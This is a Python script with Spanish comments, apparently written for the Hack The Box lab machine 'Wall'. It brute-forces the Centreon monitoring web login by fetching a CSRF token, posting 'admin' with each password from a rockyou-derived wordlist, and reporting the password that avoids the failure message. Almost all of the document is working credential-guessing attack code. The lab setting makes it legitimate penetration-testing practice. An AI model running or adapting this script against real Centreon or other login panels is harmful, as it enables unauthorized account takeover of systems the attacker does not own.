#!/usr/bin/python3
# coding: utf-8
# Usado para la maquina Wall de HTB

import sys
import time
import requests
import signal
import re
import pdb

from pwn import *

def def_handler(sig, frame):
        print("\n[+] Saliendo .. .\n")
        sys.exit(1)

# Crtl+C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
main_url = "http://10.10.10.157/centreon/index.php"


def makeRequest(password):
# Variable "S" para crear una session con la que poder jugar con peticiones Get/Post en la misma Session
        s = requests.session()
# Variable "R" para arrastrar la Variable anterior "S" para arrastrar la session y poder Trabajar con el "Centreon Token" al hacer la peticion a "MAIN__URL"
        r = s.get(main_url)
# Token en el que filtramos con expresiones Regulares para filtrarlo y pasarlo por cada peticion correctamente
        centreon_token = re.findall(r'type="hidden" value="(.*?)"', r.text)[0]
# Data que Formalizamos (Depende de la propia web)
        login_data = {

        'useralias': 'admin',
        'password': password,
        'submitLogin': 'Connect',
        'centreon_token': centreon_token

        }

        r = s.post(main_url, data=login_data)

# Bucle if para que cuando la frase Credentianls Incorrect NO se encuentren en la Respuesta del Servidor nos reporte la Contraseña Correcta
        if "Your credentials are incorrect." not in r.text:
# Actualizacion de la barra de Progreso P1
                p1.status("La Password ha sido encontrada: %s" % password)
                sys.exit(0)

if __name__ == '__main__':

# Declaramos una variable "f" que nos abra un diccionario (mil primeras lineas Rockyou.txt) con permisos de lectura
        f = open("dicc.txt", "r")
# Barras de estado
        p1 = log.progress("Fuerza Bruta contra Centreon")
        p1.status("Iniciando proceso de Fuerza Bruta contra el Panel Loguin")
        time.sleep(2)
# Para cada Password que se lea se va a tramitar una peticion web probando la Password
        for password in f.readlines():
                p1.status("Probando la Password: %s" % password.strip("\n"))
# Funcion Principal
                makeRequest(password.strip("\n"))
